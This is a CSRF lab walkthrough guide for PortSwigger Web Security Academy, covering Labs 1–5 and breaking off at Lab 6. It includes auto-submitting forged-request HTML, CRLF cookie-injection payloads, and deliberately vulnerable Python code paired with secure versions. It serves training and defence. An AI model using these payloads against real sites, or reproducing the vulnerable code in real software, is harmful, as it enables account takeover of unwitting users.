# Cross-Site Request Forgery (CSRF) - Complete PortSwigger Labs Guide

## Overview

This comprehensive guide covers all 11 PortSwigger Web Security Academy CSRF labs, providing detailed exploitation techniques, step-by-step solutions, exact payloads, and professional security guidance. Master CSRF attacks from basic exploitation to advanced bypass techniques.

### What is CSRF?

Cross-Site Request Forgery (CSRF) is an attack that forces an authenticated user to execute unwanted actions on a web application. The attacker tricks the victim's browser into sending malicious requests using the victim's credentials and session.

**Impact:**
- Unauthorized state-changing operations
- Account takeover (email change → password reset)
- Financial transactions
- Data modification or deletion
- Administrative action abuse

## Table of Contents

1. [Lab 1: CSRF with No Defenses](#lab-1-csrf-vulnerability-with-no-defenses)
2. [Lab 2: Token Validation Depends on Request Method](#lab-2-csrf-where-token-validation-depends-on-request-method)
3. [Lab 3: Token Not Tied to User Session](#lab-3-csrf-where-token-is-not-tied-to-user-session)
4. [Lab 4: Token Tied to Non-Session Cookie](#lab-4-csrf-where-token-is-tied-to-non-session-cookie)
5. [Lab 5: Token Duplicated in Cookie](#lab-5-csrf-where-token-is-duplicated-in-cookie)
6. [Lab 6: Token Validation Depends on Token Being Present](#lab-6-csrf-where-token-validation-depends-on-token-being-present)
7. [Lab 7: Referer Validation Depends on Header Being Present](#lab-7-csrf-where-referer-validation-depends-on-header-being-present)
8. [Lab 8: Referer Validation Broken](#lab-8-csrf-with-broken-referer-validation)
9. [Lab 9: SameSite Strict Bypass via Client-Side Redirect](#lab-9-samesite-strict-bypass-via-client-side-redirect)
10. [Lab 10: SameSite Strict Bypass via Sibling Domain](#lab-10-samesite-strict-bypass-via-sibling-domain)
11. [Lab 11: SameSite Lax Bypass via Method Override](#lab-11-samesite-lax-bypass-via-method-override)

---

## Lab 1: CSRF Vulnerability with No Defenses

### Lab Information
- **Difficulty Level:** Apprentice
- **URL:** https://portswigger.net/web-security/csrf/lab-no-defenses
- **Credentials:** wiener:peter

### Vulnerability Description

This lab demonstrates the most basic CSRF vulnerability where state-changing functionality has no protective mechanisms:
- No CSRF tokens
- No Referer header validation
- No SameSite cookie restrictions
- No origin checking

Any authenticated action can be triggered by an attacker through malicious HTML.

### Step-by-Step Solution

#### Step 1: Reconnaissance
1. Log in with credentials `wiener:peter`
2. Navigate to "My account"
3. Change your email address to any value
4. Intercept the request in Burp Proxy → HTTP History
5. Analyze the request structure:

```http
POST /my-account/change-email HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded

email=newemail%40web-security-academy.net
```

**Key observations:**
- Simple POST request with single parameter
- No CSRF token present
- Only authentication is the session cookie

#### Step 2: Generate CSRF Proof of Concept

**For Burp Suite Professional:**
1. Right-click the email change request in HTTP History
2. Select "Engagement tools" > "Generate CSRF PoC"
3. Click "Options" and enable "Include auto-submit script"
4. Click "Regenerate"
5. Copy the HTML

**For Burp Suite Community Edition (Manual):**
```html
<html>
  <body>
    <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="hacker@evil-domain.net">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

#### Step 3: Deploy the Exploit
1. Go to the exploit server (button in lab interface)
2. Paste the HTML into the "Body" field
3. Click "Store"
4. Click "View exploit" to test on yourself first
5. Verify your email changed in "My account"

#### Step 4: Deliver to Victim
1. Modify the email address in the exploit to avoid conflicts
2. Use a unique email (e.g., `pwned@evil-user.net`)
3. Click "Deliver exploit to victim"
4. Lab is solved when victim's email changes

### HTTP Requests and Responses

**Legitimate Email Change Request:**
```http
POST /my-account/change-email HTTP/1.1
Host: 0a12003f04e5e6c28088f5be00f70005.web-security-academy.net
Cookie: session=yZaB7qr2KN3M5vTp8Ls9RxHd
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

email=legitimate@web-security-academy.net
```

**Response:**
```http
HTTP/1.1 302 Found
Location: /my-account
Set-Cookie: session=yZaB7qr2KN3M5vTp8Ls9RxHd; Secure; HttpOnly

Email changed successfully
```

**CSRF Attack Request (from victim's browser):**
```http
POST /my-account/change-email HTTP/1.1
Host: 0a12003f04e5e6c28088f5be00f70005.web-security-academy.net
Cookie: session=VICTIM-SESSION-COOKIE
Referer: https://exploit-SERVER-ID.exploit-server.net/
Origin: https://exploit-SERVER-ID.exploit-server.net
Content-Type: application/x-www-form-urlencoded

email=pwned@attacker.com
```

### Burp Suite Features Used

1. **Proxy > HTTP History**: Capture and analyze legitimate requests
2. **CSRF PoC Generator (Professional)**: Automated exploit creation with auto-submit
3. **Exploit Server**: Host and deliver malicious HTML to simulated victims
4. **Repeater**: Test and verify requests manually

### Common Mistakes

1. **Email conflicts**: Using an email already registered causes "Email already in use" error
2. **Testing confusion**: Not using different emails for self-testing vs. victim delivery
3. **Missing auto-submit**: Forgetting JavaScript auto-submit requires manual user interaction
4. **Wrong lab ID**: Copy-pasting exploit with incorrect lab instance ID
5. **Session issues**: Testing while logged out or with expired session

### Troubleshooting Tips

- **Always test first**: Use "View exploit" to verify functionality before delivery
- **Unique emails**: Generate random emails like `test[random]@evil-user.net`
- **Check session**: Ensure you're logged in when testing
- **Verify lab ID**: Confirm the URL matches your current lab instance
- **Browser console**: Check for JavaScript errors if form doesn't submit

### Key Takeaways

1. **CSRF tokens are essential**: Without them, authenticated actions are trivially exploitable
2. **Impact is severe**: Email change can lead to full account takeover via password reset
3. **Exploitation is simple**: Basic HTML knowledge is sufficient for this attack
4. **Defense in depth**: Single layer of protection is insufficient
5. **Cookie-based auth is vulnerable**: Sessions via cookies alone don't prevent CSRF

---

## Lab 2: CSRF Where Token Validation Depends on Request Method

### Lab Information
- **Difficulty Level:** Practitioner
- **URL:** https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method
- **Credentials:** wiener:peter

### Vulnerability Description

This lab demonstrates a common implementation flaw where CSRF tokens are validated for POST requests but not for alternative HTTP methods. The application:
- Implements CSRF token validation for POST requests
- Accepts GET requests to the same endpoint
- Does not validate tokens on GET requests

**Root cause**: Developers assume only POST needs protection, forgetting that GET can also modify state when improperly implemented.

### Step-by-Step Solution

#### Step 1: Initial Analysis
1. Log in with `wiener:peter`
2. Navigate to "My account"
3. Submit email change form
4. Capture POST request in Burp Proxy:

```http
POST /my-account/change-email HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION
Content-Type: application/x-www-form-urlencoded

email=test@web-security-academy.net&csrf=TOKEN-VALUE-HERE
```

#### Step 2: Test CSRF Token Validation
1. Send request to Burp Repeater (Ctrl+R or right-click → Send to Repeater)
2. Modify the `csrf` parameter to an invalid value
3. Send the request → Observe 400 Bad Request:

```http
HTTP/1.1 400 Bad Request
Content-Type: text/html

Invalid CSRF token
```

**Confirmation**: POST requests validate CSRF tokens.

#### Step 3: Discover Method-Based Bypass
1. In Repeater, right-click the request body
2. Select "Change request method"
3. The POST converts to GET with parameters in URL:

```http
GET /my-account/change-email?email=test@web-security-academy.net&csrf=TOKEN-VALUE-HERE HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION
```

4. Send the request → **It succeeds!**
5. Try again with invalid or missing CSRF token → **Still succeeds!**

**Vulnerability confirmed**: GET requests bypass CSRF validation.

#### Step 4: Create GET-Based CSRF Exploit

```html
<html>
  <body>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="attacker@evil-domain.net">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**Key difference**: No `method="POST"` attribute, so form defaults to GET. No CSRF token included.

#### Step 5: Deploy and Deliver
1. Paste exploit into exploit server Body
2. Click "Store"
3. Test with "View exploit" → Verify email changes
4. Update email to unique value
5. Click "Deliver exploit to victim"

### HTTP Requests and Responses

**POST with Valid Token (Works):**
```http
POST /my-account/change-email HTTP/1.1
Cookie: session=vK9mPqR3wX2nL5tY7Zs8Hj4D
Content-Type: application/x-www-form-urlencoded

email=valid@example.com&csrf=AbCd123EfGh456IjKl789MnOp012QrSt

Response:
HTTP/1.1 302 Found
Location: /my-account
```

**POST with Invalid Token (Fails):**
```http
POST /my-account/change-email HTTP/1.1
Cookie: session=vK9mPqR3wX2nL5tY7Zs8Hj4D

email=test@example.com&csrf=INVALID_TOKEN

Response:
HTTP/1.1 400 Bad Request
Invalid CSRF token
```

**GET with No Token (Works - Vulnerability!):**
```http
GET /my-account/change-email?email=pwned@attacker.com HTTP/1.1
Cookie: session=vK9mPqR3wX2nL5tY7Zs8Hj4D

Response:
HTTP/1.1 302 Found
Location: /my-account
```

### Burp Suite Features Used

1. **Proxy > HTTP History**: Capture original POST request
2. **Repeater**: Manual request manipulation and testing
3. **Change Request Method**: Context menu option converts POST ↔ GET
4. **CSRF PoC Generator**: Can generate GET-based PoCs after method conversion
5. **Intruder (Optional)**: Test multiple method types (GET, PUT, DELETE)

### Common Mistakes

1. **Assuming all methods protected**: Not testing alternative HTTP methods
2. **Including CSRF token in GET**: Unnecessarily adding token to GET exploit
3. **Using POST in exploit**: Explicitly setting `method="POST"` defeats the bypass
4. **Email conflicts**: Reusing email addresses
5. **Wrong form action**: Incorrect URL or lab ID

### Troubleshooting Tips

- **Request rejected despite GET**: Verify CSRF parameter is completely removed
- **Lab doesn't solve**: Confirm victim's email actually changed
- **Form using POST**: Check HTML - forms default to GET if no method specified
- **Email conflict**: Use unique, random email addresses

### Vulnerable Code Example

```python
# Vulnerable implementation
@app.route('/change-email', methods=['GET', 'POST'])
def change_email():
    if request.method == 'POST':
        csrf_token = request.form.get('csrf')
        if not validate_csrf(csrf_token, session):
            return "Invalid CSRF token", 400

    # Both GET and POST reach here
    new_email = request.values.get('email')  # Gets from GET or POST
    update_user_email(current_user, new_email)
    return redirect('/my-account')
```

### Defense Recommendations

**Secure Implementation:**
```python
@app.route('/change-email', methods=['POST'])  # Only POST
def change_email():
    # Validate CSRF for all requests
    csrf_token = request.form.get('csrf')
    if not csrf_token or not validate_csrf(csrf_token, session):
        return "Invalid CSRF token", 400

    new_email = request.form.get('email')
    update_user_email(current_user, new_email)
    return redirect('/my-account')
```

**Best practices:**
1. Enforce CSRF protection regardless of HTTP method
2. Use POST for state-changing operations (REST principles)
3. Reject GET requests for sensitive actions
4. Framework-level CSRF protection (e.g., Flask-WTF, Django CSRF)
5. Regular security testing of all HTTP methods

### Key Takeaways

1. **Method-based validation is insufficient**: All methods must validate CSRF tokens
2. **REST principles matter**: GET should be idempotent and safe (read-only)
3. **Framework defaults vary**: Some only protect POST by default
4. **Testing methodology**: Always test all supported HTTP methods
5. **Defense must be comprehensive**: Partial protection is no protection

---

## Lab 3: CSRF Where Token Is Not Tied to User Session

### Lab Information
- **Difficulty Level:** Practitioner
- **URL:** https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session
- **Credentials:** wiener:peter, carlos:montoya

### Vulnerability Description

This lab demonstrates a critical CSRF token implementation flaw. The application generates and validates CSRF tokens, but these tokens are not cryptographically bound to individual user sessions:

- Token format and existence are validated
- Tokens are **not** tied to specific user sessions
- A token from User A can be used to attack User B
- Server validates "is this a valid token?" not "is this token for this user?"

**Attack vector**: Attacker uses their own valid CSRF token in the exploit to attack other users.

### Step-by-Step Solution

#### Step 1: Generate Your Own Valid Token
1. Log in with `wiener:peter`
2. Navigate to email change functionality
3. **Intercept** the request in Burp Proxy but don't forward yet
4. Copy the CSRF token value from the request:

```http
POST /my-account/change-email HTTP/1.1
Cookie: session=WIENER-SESSION
Content-Type: application/x-www-form-urlencoded

email=test@example.com&csrf=YOUR-VALID-TOKEN-HERE
```

5. **Drop the request** (don't send it to preserve the token)
6. Store the token value for later use

#### Step 2: Test Cross-User Token Validity
1. Open a private/incognito browser window
2. Log in with `carlos:montoya`
3. Submit an email change request
4. Capture the request in Burp and send to Repeater
5. Replace Carlos's CSRF token with wiener's token:

```http
POST /my-account/change-email HTTP/1.1
Cookie: session=CARLOS-SESSION-COOKIE
Content-Type: application/x-www-form-urlencoded

email=test@example.com&csrf=WIENER-CSRF-TOKEN
```

6. Send the request → **It succeeds!**

**Vulnerability confirmed**: Tokens work across different user sessions.

#### Step 3: Understand Token Lifecycle

**Important**: Tokens in this lab are single-use. After testing, you need a fresh token for the actual exploit.

To get a fresh token:
1. In wiener's session, refresh the email change page
2. View page source (Ctrl+U) or inspect with Developer Tools
3. Extract the token from the hidden form field:

```html
<form method="POST" action="/my-account/change-email">
  <input required type="hidden" name="csrf" value="NEW-FRESH-TOKEN">
  <input required type="email" name="email">
</form>
```

#### Step 4: Create CSRF Exploit with Valid Token

```html
<html>
  <body>
    <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="attacker@evil-domain.net">
      <input type="hidden" name="csrf" value="YOUR-FRESH-TOKEN-HERE">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

#### Step 5: Deploy and Deliver
1. Paste exploit into exploit server Body
2. Store the exploit
3. **Test first** with "View exploit" (should change your email)
4. Get **another fresh token** for the victim attack
5. Update the `csrf` value in the exploit HTML
6. Change target email to a unique address
7. Click "Deliver exploit to victim"

### HTTP Requests and Responses

**Wiener's Token Generation:**
```http
GET /my-account HTTP/1.1
Cookie: session=wiener-session-abc123

Response:
HTTP/1.1 200 OK
<form method="POST" action="/my-account/change-email">
  <input name="csrf" value="TokenFromWienerAccount">
  ...
</form>
```

**Carlos's Request Using Wiener's Token (Succeeds!):**
```http
POST /my-account/change-email HTTP/1.1
Cookie: session=carlos-session-xyz789
Content-Type: application/x-www-form-urlencoded

email=pwned@attacker.com&csrf=TokenFromWienerAccount

Response:
HTTP/1.1 302 Found
Location: /my-account
```

**Token Reuse Attempt (Fails - Single Use):**
```http
POST /my-account/change-email HTTP/1.1
Cookie: session=carlos-session-xyz789

email=another@example.com&csrf=TokenFromWienerAccount

Response:
HTTP/1.1 400 Bad Request
Invalid CSRF token (already used)
```

### Burp Suite Features Used

1. **Proxy > Intercept**: Capture tokens without consuming them (drop before forwarding)
2. **Proxy > HTTP History**: Analyze token generation and flow
3. **Repeater**: Test cross-user token validity systematically
4. **Multiple Browser Profiles**: Test concurrent sessions (main + incognito)
5. **Exploit Server**: Host and deliver CSRF payloads

### Common Mistakes

1. **Token reuse**: Forgetting single-use limitation and not refreshing before final delivery
2. **Email conflicts**: Using already-registered email addresses
3. **Session confusion**: Using victim's token instead of attacker's token (defeats the purpose)
4. **Testing exhaustion**: Consuming valid token during testing, leaving none for delivery
5. **Timing issues**: Token expiring before victim clicks exploit
6. **Wrong token source**: Using Carlos's token instead of wiener's token in the exploit

### Troubleshooting Tips

- **"Invalid CSRF token" error**: Get a fresh token from your own session
- **Email not changing**: Check for email conflicts or session issues
- **Exploit works in testing but not victim**: You used the same single-use token twice
- **Can't reproduce cross-user validity**: Ensure genuinely different sessions in different browsers
- **Token appears expired**: Refresh the email change page to generate new token

### Vulnerable Code Example

```python
# Vulnerable: Token stored globally, not per-session
valid_tokens = set()  # Global token storage

def generate_csrf_token():
    token = secrets.token_hex(32)
    valid_tokens.add(token)
    return token

def validate_csrf_token(token):
    if token in valid_tokens:
        valid_tokens.remove(token)  # Single-use
        return True
    return False

# No session binding!
```

### Secure Implementation

```python
# Secure: Token bound to user session
def generate_csrf_token(session_id):
    token = secrets.token_hex(32)
    # Store in session-specific storage
    session_tokens[session_id] = {
        'token': token,
        'created': datetime.now()
    }
    return token

def validate_csrf_token(token, session_id):
    stored = session_tokens.get(session_id)
    if not stored:
        return False

    # Check token matches and hasn't expired
    if (stored['token'] == token and
        datetime.now() - stored['created'] < timedelta(hours=1)):
        del session_tokens[session_id]  # Single-use
        return True
    return False
```

### Defense Recommendations

1. **Bind tokens to sessions**: Cryptographically tie CSRF tokens to user sessions
2. **Server-side storage**: Store tokens server-side, indexed by session ID
3. **Token rotation**: Generate new token for each form render
4. **Expiration**: Implement reasonable token expiration times
5. **Framework usage**: Use framework-provided CSRF protection (Django, Flask, Rails)

### Key Takeaways

1. **Token existence ≠ Token validity**: Checking token format is insufficient
2. **Session binding is critical**: Tokens must be tied to specific user sessions
3. **Single-use adds complexity**: Attackers must time exploits carefully but doesn't prevent attack
4. **Implementation matters**: Even with tokens, improper implementation fails
5. **Testing with multiple accounts**: Always verify session isolation in security testing

---

## Lab 4: CSRF Where Token Is Tied to Non-Session Cookie

### Lab Information
- **Difficulty Level:** Practitioner
- **URL:** https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie
- **Credentials:** wiener:peter, carlos:montoya

### Vulnerability Description

This lab demonstrates a sophisticated vulnerability involving improper token-cookie binding. The application uses two separate cookies:
1. **session**: Identifies the authenticated user
2. **csrfKey**: Stores a key used to validate CSRF tokens

**The vulnerability**:
- CSRF tokens validate against `csrfKey` cookie, NOT `session` cookie
- `csrfKey` can be injected via CRLF injection in search functionality
- Attacker sets their own `csrfKey` in victim's browser
- Attacker's CSRF token validates against their injected cookie
- Victim's `session` cookie still authenticates the victim

**Attack chain**: Cookie injection + CSRF token validation bypass

### Step-by-Step Solution

#### Step 1: Analyze Cookie Structure

1. Log in with `wiener:peter`
2. Submit email change and observe request:

```http
POST /my-account/change-email HTTP/1.1
Cookie: session=abc123xyz; csrfKey=def456uvw
Content-Type: application/x-www-form-urlencoded

email=test@example.com&csrf=TOKEN-VALUE
```

**Key observation**: Two separate cookies for authentication and CSRF validation.

#### Step 2: Test Cookie Dependencies

1. Send request to Burp Repeater
2. **Test 1**: Change `session` cookie → Request fails (not authenticated)
3. **Test 2**: Change `csrfKey` cookie → CSRF token rejected
4. **Test 3**: Change both `csrfKey` and `csrf` parameter to values from wiener's account:

```http
POST /my-account/change-email HTTP/1.1
Cookie: session=CARLOS-SESSION; csrfKey=WIENER-CSRF-KEY
Content-Type: application/x-www-form-urlencoded

email=test@example.com&csrf=WIENER-TOKEN
```

**Result**: Request succeeds! Email changes for Carlos using wiener's csrfKey/token.

**Finding**: Token validates against `csrfKey`, not `session`.

#### Step 3: Find Cookie Injection Vector

1. Use the search functionality in the application
2. Submit search: `test`
3. Observe response in Burp:

```http
HTTP/1.1 200 OK
Set-Cookie: LastSearchTerm=test

<h1>0 results for 'test'</h1>
```

4. Search term is reflected in Set-Cookie header!
5. Test CRLF injection (URL-encoded newlines):

```
/?search=test%0d%0aSet-Cookie:%20csrfKey=ATTACKER-KEY
```

6. Observe successful injection:

```http
HTTP/1.1 200 OK
Set-Cookie: LastSearchTerm=test
Set-Cookie: csrfKey=ATTACKER-KEY
```

#### Step 4: Add SameSite Bypass

For cross-origin cookie injection to work, add `SameSite=None`:

```
/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
```

**URL encoding**:
- `%0d%0a` = CRLF (Carriage Return Line Feed)
- `%20` = Space
- `%3b` = Semicolon (`;`)

#### Step 5: Create Combined Exploit

```html
<html>
  <body>
    <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="attacker@evil-domain.net">
      <input type="hidden" name="csrf" value="YOUR-CSRF-TOKEN">
    </form>
    <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit();">
  </body>
</html>
```

**Attack flow**:
1. Victim visits exploit page
2. `<img>` tag loads cookie injection URL
3. Browser requests search endpoint
4. Server responds with injected `csrfKey` cookie
5. `onerror` handler triggers (image "fails" to load)
6. Form submits with attacker's CSRF token
7. Server validates token against injected cookie → Success!

#### Step 6: Deploy and Deliver

1. Get fresh CSRF token and csrfKey from your account
2. Update both values in the exploit HTML
3. Paste into exploit server Body
4. Store and test with "View exploit"
5. Change email to unique value
6. Get fresh token/key again (single-use)
7. Update exploit and deliver to victim

### HTTP Requests and Responses

**Cookie Injection via Search:**
```http
GET /?search=test%0d%0aSet-Cookie:%20csrfKey=AttackerKey%3b%20SameSite=None HTTP/1.1

Response:
HTTP/1.1 200 OK
Set-Cookie: LastSearchTerm=test
Set-Cookie: csrfKey=AttackerKey; SameSite=None
Content-Type: text/html

<h1>0 results for 'test'</h1>
```

**Successful CSRF Attack:**
```http
POST /my-account/change-email HTTP/1.1
Cookie: session=VictimSession; csrfKey=AttackerKey
Content-Type: application/x-www-form-urlencoded

email=pwned@attacker.com&csrf=TokenMatchingAttackerKey

Response:
HTTP/1.1 302 Found
Location: /my-account
```

### Burp Suite Features Used

1. **Proxy > HTTP History**: Identify Set-Cookie behaviors and reflection
2. **Repeater**: Test cookie dependencies systematically
3. **Decoder**: URL-encode CRLF characters and special characters
4. **Intruder (optional)**: Test various CRLF injection payloads
5. **Multiple Browser Contexts**: Test cross-account scenarios
6. **Exploit Server**: Host and deliver attack chain

### Common Mistakes

1. **Missing SameSite=None**: Cookie won't be sent cross-site without this
2. **Incorrect URL encoding**: Using `\r\n` instead of `%0d%0a`
3. **Form submits before cookie set**: Timing issue with event handlers
4. **Email conflicts**: Using duplicate email addresses
5. **Stale tokens**: Not refreshing tokens between tests
6. **Wrong cookie name**: Injecting `csrf` instead of `csrfKey`
7. **Semicolon not encoded**: Breaking the Set-Cookie header format

### Troubleshooting Tips

- **Cookie not injecting**: Verify CRLF encoding is `%0d%0a`
- **Form submits too early**: Use `onerror` handler or add timing delay with `setTimeout`
- **Token rejected**: Ensure injected `csrfKey` matches the `csrf` token's key
- **SameSite blocking**: Confirm `SameSite=None` is properly URL-encoded (`%3b%20SameSite=None`)
- **Exploit works once then fails**: Single-use tokens require fresh values each time

### Vulnerable Code Example

```python
# Vulnerable: Separate cookie for CSRF key
@app.route('/change-email', methods=['POST'])
def change_email():
    csrf_key = request.cookies.get('csrfKey')  # Separate cookie!
    csrf_token = request.form.get('csrf')

    if not validate_token_with_key(csrf_token, csrf_key):
        return "Invalid CSRF token", 400

    # Uses session cookie for authentication
    user_id = get_user_from_session(request.cookies.get('session'))
    update_email(user_id, request.form.get('email'))
    return redirect('/my-account')

# Header injection vulnerability
@app.route('/')
def search():
    query = request.args.get('search', '')
    response = make_response(f"Results for: {query}")
    response.headers['Set-Cookie'] = f"LastSearchTerm={query}"  # VULNERABLE!
    return response
```

### Secure Implementation

```python
# Secure: Token tied to session
@app.route('/change-email', methods=['POST'])
def change_email():
    session_id = request.cookies.get('session')
    csrf_token = request.form.get('csrf')

    # Validate token against session, not separate cookie
    stored_token = get_csrf_token_from_session(session_id)
    if not constant_time_compare(csrf_token, stored_token):
        return "Invalid CSRF token", 400

    user_id = get_user_from_session(session_id)
    update_email(user_id, request.form.get('email'))
    return redirect('/my-account')

# Prevent header injection
@app.route('/')
def search():
    query = request.args.get('search', '')
    # Sanitize input - reject CRLF characters
    if '\r' in query or '\n' in query:
        return "Invalid input", 400

    response = make_response(f"Results for: {escape(query)}")
    # Use framework's cookie setter, not raw headers
    response.set_cookie('LastSearchTerm', query, samesite='Strict')
    return response
```

### Defense Recommendations

1. **Bind tokens to sessions**: CSRF tokens must validate against session cookies
2. **Prevent header injection**: Sanitize all user input in HTTP headers
3. **Use framework cookie setters**: Don't manually build Set-Cookie headers
4. **Reject CRLF characters**: Block `\r` and `\n` in any reflected input
5. **Defense in depth**: Even with proper token validation, prevent injection vectors

### Key Takeaways

1. **Cookie separation is dangerous**: CSRF validation must use session cookies
2. **Header injection is critical**: Minor reflection can enable cookie injection
3. **Attack chains multiply risk**: Multiple small issues create critical vulnerability
4. **SameSite helps but isn't sufficient**: Proper token validation still required
5. **Framework usage matters**: Roll-your-own security often has flaws

---

## Lab 5: CSRF Where Token Is Duplicated in Cookie

### Lab Information
- **Difficulty Level:** Practitioner
- **URL:** https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie
- **Credentials:** wiener:peter

### Vulnerability Description

This lab demonstrates the "double submit cookie" pattern vulnerability. The application:
- Sends CSRF token in both a cookie and request parameter
- Validates by simple comparison: `cookie_value == parameter_value`
- Does NOT maintain server-side state or validate against sessions

**The flaw**: If attacker can inject a cookie with any value, they can use the same arbitrary value in both cookie and parameter, bypassing validation entirely.

**Simpler than Lab 4**: Attacker doesn't need a valid token—any value works as long as cookie matches parameter.

### Step-by-Step Solution

#### Step 1: Analyze the Token Mechanism

1. Log in with `wiener:peter`
2. Submit email change and capture:

```http
POST /my-account/change-email HTTP/1.1
Cookie: session=abc123; csrf=TokenXYZ
Content-Type: application/x-www-form-urlencoded

email=test@example.com&csrf=TokenXYZ
```

**Observation**: `csrf` cookie value matches `csrf` parameter value.

#### Step 2: Test the Validation Logic

1. Send to Repeater
2. Change `csrf` parameter only → Rejected (mismatch)
3. Change both cookie and parameter to **same arbitrary value**:

```http
POST /my-account/change-email HTTP/1.1
Cookie: session=abc123; csrf=fake
Content-Type: application/x-www-form-urlencoded

email=test@example.com&csrf=fake
```

4. Request succeeds! **Validation is just equality check.**

#### Step 3: Identify Cookie Injection Point

1. Use search functionality: `/?search=test`
2. Observe response:

```http
HTTP/1.1 200 OK
Set-Cookie: LastSearchTerm=test
```

3. Test CRLF injection:

```
/?search=test%0d%0aSet-Cookie:%20csrf=fake
```

4. Verify injection works:

```http
HTTP/1.1 200 OK
Set-Cookie: LastSearchTerm=test
Set-Cookie: csrf=fake
```

#### Step 4: Add SameSite Bypass

```
/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
```

#### Step 5: Create Complete Exploit

```html
<html>
  <body>
    <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="attacker@evil-domain.net">
      <input type="hidden" name="csrf" value="fake">
    </form>
    <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();">
  </body>
</html>
```

**Attack flow**:
1. Image loads with cookie injection URL
2. Server sets `csrf=fake` cookie with `SameSite=None`
3. `onerror` triggers form submission
4. Form sends `csrf=fake` in both cookie and parameter
5. Server validates: `"fake" == "fake"` → Passes!
6. Email changes successfully

#### Step 6: Deploy and Deliver

1. Paste into exploit server Body
2. Store and test with "View exploit"
3. Change email to unique value
4. Deliver exploit to victim

### HTTP Requests and Responses

**Legitimate Double Submit Pattern:**
```http
POST /my-account/change-email HTTP/1.1
Cookie: session=J7pK9mL3vN5wX; csrf=AuthenticToken123
Content-Type: application/x-www-form-urlencoded

email=user@example.com&csrf=AuthenticToken123

Response:
HTTP/1.1 302 Found
Location: /my-account
```

**Cookie Injection:**
```http
GET /?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None HTTP/1.1

Response:
HTTP/1.1 200 OK
Set-Cookie: LastSearchTerm=test
Set-Cookie: csrf=fake; SameSite=None
```

**Successful Attack with Arbitrary Value:**
```http
POST /my-account/change-email HTTP/1.1
Cookie: session=VictimSession; csrf=fake
Content-Type: application/x-www-form-urlencoded

email=pwned@attacker.com&csrf=fake

Response:
HTTP/1.1 302 Found
Location: /my-account
```

### Burp Suite Features Used

1. **Proxy > HTTP History**: Observe double submit pattern
2. **Repeater**: Test validation bypass with arbitrary values
3. **Decoder**: URL-encode CRLF and special characters
4. **Comparison Tools**: Verify cookie/parameter matching
5. **Exploit Server**: Host and deliver payload

### Common Mistakes

1. **Using different values**: Cookie and parameter must match exactly
2. **Missing SameSite=None**: Cookie won't be sent cross-origin
3. **Timing issues**: Form submitting before cookie is set
4. **Wrong event handler**: Using `onload` instead of `onerror` for images
5. **Email conflicts**: Using already-registered emails
6. **URL encoding errors**: Improper encoding of semicolon or CRLF

### Troubleshooting Tips

- **"Invalid CSRF token"**: Verify cookie and parameter are identical
- **Cookie not set**: Check CRLF encoding is correct (`%0d%0a`)
- **Attack works locally but not on victim**: Ensure `SameSite=None` is present
- **Form submits too early**: Use `onerror` handler or explicit timing
- **Special characters breaking**: URL-encode all special characters (`;` = `%3b`)

### Vulnerable Code Example

```python
# Vulnerable: Double submit without server-side validation
@app.route('/change-email', methods=['POST'])
def change_email():
    cookie_token = request.cookies.get('csrf')
    param_token = request.form.get('csrf')

    # Simple equality check - no server-side state!
    if cookie_token != param_token:
        return "Invalid CSRF token", 400

    # Anyone who can set the cookie can bypass this
    user_id = get_user_from_session(request.cookies.get('session'))
    update_email(user_id, request.form.get('email'))
    return redirect('/my-account')
```

### Secure Implementation

```python
# Secure: Server-side token storage
@app.route('/change-email', methods=['POST'])
def change_email():
    session_id = request.cookies.get('session')
    param_token = request.form.get('csrf')

    # Validate against server-side stored token
    stored_token = get_token_from_session(session_id)
    if not stored_token or not constant_time_compare(param_token, stored_token):
        return "Invalid CSRF token", 400

    user_id = get_user_from_session(session_id)
    update_email(user_id, request.form.get('email'))
    return redirect('/my-account')
```

### Defense Recommendations

**Why Double Submit Cookies Are Weak**:
- No server-side validation
- Vulnerable to cookie injection attacks
- Can't detect compromised tokens
- Simple to bypass if cookies can be set

**Better approach**:
1. Store tokens server-side tied to sessions
2. Validate tokens against server storage, not cookies
3. Prevent header injection vulnerabilities
4. Use Content-Security-Policy headers
5. Implement proper SameSite on session cookies
6. Use framework-provided CSRF protection

### Key Takeaways

1. **Double submit cookies provide weak protection**: Only secure if cookies cannot be injected
2. **Client-side validation is insufficient**: Must validate server-side with session binding
3. **Cookie injection defeats many defenses**: Any header injection vulnerability is critical
4. **Simplicity isn't security**: Simple comparison `cookie == parameter` is easily bypassed
5. **Proper CSRF requires server state**: Tokens must be stored and validated server-side

---

## Lab 6: CSRF Where Token Validation Depends on Token Being Present

### Lab Information
- **Difficulty Level:** Practitioner
